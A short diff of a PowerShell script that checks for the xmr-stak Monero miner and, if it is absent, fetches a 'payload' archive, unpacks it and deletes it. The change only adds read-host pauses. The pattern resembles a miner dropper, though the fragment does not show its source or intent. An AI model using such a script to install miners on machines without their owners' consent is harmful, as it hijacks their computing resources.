@@ -140,7 +140,9 @@ if (!(Test-Path "$opsDir\xmr-stak-win64-2.8.3"))
 {
 
   payload $payloadDestination
+  read-host
   Expand-Archive -LiteralPath $payloadDestination -DestinationPath $opsDir
+  read-host
   Remove-Item $payloadDestination -Force
   read-host
 
